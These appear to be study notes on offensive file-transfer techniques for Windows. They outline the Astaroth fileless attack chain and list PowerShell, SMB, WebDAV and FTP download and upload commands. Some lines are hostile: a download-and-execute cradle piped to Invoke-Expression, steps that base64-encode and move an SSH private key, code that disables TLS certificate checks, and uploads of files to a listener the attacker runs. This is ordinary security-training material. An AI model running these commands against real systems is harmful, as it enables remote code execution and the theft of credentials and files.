## Introduction
- **Fileless Threat**: A threat that doesn't come in a file, but doesn't mean that there is no file transfer operation
- **Astaroth Attack**: Followed these steps
	- A malicious link in a spear-phishing email led to an **LNK** file
	- Double clicking the **LNK** file executed the **WWIC** tool with "/Format" parameter
	- It allowed the download and execution of malicious JavaScript code
	- The JavaScript code, in turn, downloads payloads by abusing the **Bitsadmin** tool
	- All the payloads were base64-encoded and decoded using the **Certutil** tool resulting in a few **DLL** files
	- **regsvr32** tool was then used to load one of the decoded **DLLs,** which decrypted and loaded other files until the final payload, ***Astaroth***, was injected into the **Userinit** process

## Download Operations
### 1) PowerShell Base64 Encode & Decode
- **md5sum** is used to calculate and verify 128-bit MD5 checksums
- MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere

1. **Check SSH Key MD5 Hash**
	- `md5sum id_rsa(file name)`

2. **Encode SSH Key to Base64**
	- `cat id_rsa | base64 -w 0; echo`

3. **Decode The Base64 SSH Key on The Windows Machine**
	- `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<The base 64 ssh key>"))`

4. **Confirm the MD5 Hash on the Windows Machine**
- `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`
****
### 2) PowerShell Web Downloads
- Most companies allow **HTTP** and **HTTPS** outbound traffic through the firewall to allow employee productivity
- Some defenders use **Web filtering** solutions to prevent access to specific website categories, block the download of files (like .exe), or only allow access to a list of whitelisted websites in more restricted networks
- In most versions of PowerShell, **System.Net.WebClient** class can be used to download file over **HTTP**, **HTTPS**, and **FTP** 

**WebClient Methods**
- `OpenRead`: Returns the data from a resource as a **Stream**
- `OpenReadAsync`: Returns the data from a resource without blocking the calling thread
- `DownloadData`: Downloads data from a resource and returns a Byte array
- `DownloadDataAsync`: Downloads data from a resource and returns a Byte array without blocking the calling thread
- `DownloadFile`: Downloads data from a resource to a local file
- `DownloadFileAsync`: Downloads data from a resource to a local file without blocking the calling thread
- `DownloadString`: Downloads a String from a resource and returns a String
- `DownloadStringAsync`: Downloads a String from a resource and returns a String without blocking the calling thread

1. **PowerShell DownloadFile Method**
	- `(New-Object Net.WebClient).DownloadFile('[file link]', 'file download path')`
	- `(New-Object Net.WebClient).DownloadFileAsync('[file link]', 'file download path')`

2. **PowerShell DownloadString - Fileless Method**
	- `(New-Object Net.WebClient).DownloadString('[file link]')`
	- `EIX (Invoke Expression)`: Alias for PowerShell command, `Invoke Expression`, that runs a String as command, accepts pipelining
	- `(New-Object Net.WebClient).DownloadString('[file link]') | EIX`: Runs the downloaded String as a command

3. **PowerShell Invoke-WebRequest**
	- `Invoke-WebRequest [download link] -OutFile [download path]`
	- Slower, can use aliases `curl`, `iwr`, and `wget`

**Common Errors with PowerShell**
1. Sometimes Internet Explorer incomplete configuration prevents the download
	- **Fix:** Add the parameter `-UseBasicParsing`
2. Sometimes in SSL/TLS secure channel the certificate is not trusted which prevents the download
	- **Fix**: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

### 3) SMB Downloads
**Unauthenticated SMB Server**
1. **Create the SMB Server on Linux**
	- `sudo impacket-smbserver share -smb2support /tmp/smbshare`

2. **Copy a File from the SMB Server on Windows**
	- `copy \\[ip address of the Linux machine]\\[file path on smb]`
	- New versions of Windows block unauthenticated guest access

**Authenticated SMB Server**
1. **Create the SMB Server with a Username and Password on Linux**
	- `sudo impacket-smbserver share -smb2support /tmp/subshare -user [username] -password [password]`

2. **Mount the SMB Server with Username and Password on Windows**
	- `net use n: \\[ip address of the Linux machine]\[folder] /user:[username] [password]`

3. **Copy a File from the SMB Server**
	- `copy n:\[file name]`

### 4) FTP Downloads
1. **Installing the FTP Server Python3 Module - pyftpdlib**
	- `sudo pip3 install pyftpdlib`
2. **Setting up a Python3 FTP Server**
	- `sudo python3 -m pyftpdlib --port 21`
3. **Transferring Files from an FTP Server Using PowerShell**
	- `(New-Object Net.WebClient).DownloadFile('ftp://[ip address of the ftp server]/[file path]', 'C:\[Download location]')`

## Upload Operations
### 1) PowerShell Base64 Encode & Decode
1. **Encode File Using PowerShell**
	- `[Convert]::ToBase64String((Get-Content -path "C:[file path]" -Encoding byte))`
	- `Get-FileHash "C:\[file path]" -Algorithm MD5 | select Hash`

1. **Decode Base64 String in Linux**
	- `echo [encoded file] | base64 -d > file.txt`
	- `md5sum file.txt`
****
### 2) PowerShell Web Uploads
- Doesn't have built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod`  to build our upload function
- We need a server that accepts uploading which is not default, we can use **uploadserver** for this
1. **Installing a Configured WebServer with Upload**
	- `pip3 install webserver`
	- `python3 -m uploadserver`
2. **PowerShell Script to Upload a File to Python Upload Server**
	- `IEX(New-Object Net.WebClient).DownloadString('[file link]')`
	- `Invoke-FileUpload -Uri http://[ip address]:8000/upload -File C:\[file path]`
- **OR**
1. **PowerShell Base64 Web Upload**
	- `$b64 = [System.convert]::ToBase64String((Get-Content -Path '[file path]' -Encoding Byte))`
	- `Invoke-WebRequest -Uri http://[ip address]:8000/ -Metho POST -Body $b64`
	- We catch the base64 data with NetCat on Linux
	- `nc -lnvp 8000`
	- `echo <base64> | base64 -d -w 0 > file.txt`
****
### 3) SMB Uploads
- `SMB` tries to connect with SMB protocol but if it fails then it tries to connect over **HTTP** via **WebDav (An extension on web browsers that allow running SMB over HTTP)**
1. **Configuring WebDav Server**
	- **Installing WebDav Python modules**: `sudo pip3 install wsgidav cheroot`
2. **Using the WebDav Python module**
	- `sudo wsgidav --host=0.0.0.0 --port=80 --root/tmp --auth=anonymous`
3. **Connecting to the WebDav Share**
	- `dir \\[ip address]\DavWWWRoot(you can use any folder on your path too)`
	- **DavWWRoot** is a special keyword recognized by the Windows Shell, tells Mini-Redirector driver that you are connecting the root of the WebDav server
4. **Upload Files using SMB**
	- `copy C:\\[path of the file to be uploaded] \\[ip address]\DavWWWRoot\`
****
### 4) FTP Uploads
1. `sudo python3 -m pyftpdlib --port 21 --write`
2. **PowerShell Upload File**
	- `(New-Object Net.WebClient).UploadFile('ftp://[ip address]/[location to be upload the file at/as]', 'C:\[path of the file to be uploaded]')`
3. **Create a Command File for the FTP Client to Upload a File (For non-interactive FTP sessions)**
	- `echo open [ip address] > ftpcommand.txt`
	- `echo USER anonymous >> ftpcommand.txt`
	- `echo binary >> ftpcommand.txt`
	- `echo PUT c:\[local file path] >> ftpcommand.txt`
	- `echo bye >> ftpcommand.txt`
	- `ftp -v -n -s:ftpcommand.txt`
